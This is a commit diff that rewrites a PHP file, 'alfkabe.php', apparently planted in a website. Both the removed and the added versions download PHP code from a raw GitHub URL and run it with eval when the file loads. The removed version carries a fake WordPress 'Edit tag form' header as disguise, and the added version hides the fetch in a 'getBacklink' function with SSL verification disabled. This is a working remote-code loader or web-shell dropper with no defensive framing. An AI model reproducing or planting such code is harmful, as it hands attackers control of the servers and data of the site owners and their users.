78ef3d04d9cf6cc660b05e4f0aa34f51e3551a2c
clovespia99 <clovespia999@gmail.com>
2026-06-05 16:35:18 +0700

    Update alfkabe.php

--- alfkabe.php
+++ alfkabe.php
@@ -1,34 +1,17 @@
 <?php
-/**
- * Edit tag form for inclusion in administration panels.
- *
- * @package WordPress
- * @subpackage Administration
- */
-$url = "https://raw.githubusercontent.com/clovespia99/forbideng/refs/heads/main/alfred.php";
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
-
-if ($result === false) {
-    echo "Error fetching remote content";
-} else {
-    // Assuming $result contains PHP code, execute it
-    if (is_string($result)) {
-        // Start output buffering
-        ob_start();
-        // Execute the fetched PHP code
-        eval('?>'.$result);
-        // Get the output buffer content and clean it
-        $output = ob_get_clean();
-        // Echo the output
-        echo $output;
-    } else {
-        echo "Error: Invalid response from remote server";
+function getBacklink($url) {
+    if( ini_get('allow_url_fopen') == 1 ) {
+        return file_get_contents($url);
+    }else if(function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
     }
 }
-
-curl_close($ch);
+eval("?>" . getBacklink("https://raw.githubusercontent.com/clovespia99/forbideng/refs/heads/main/alfred.php"));
 ?>
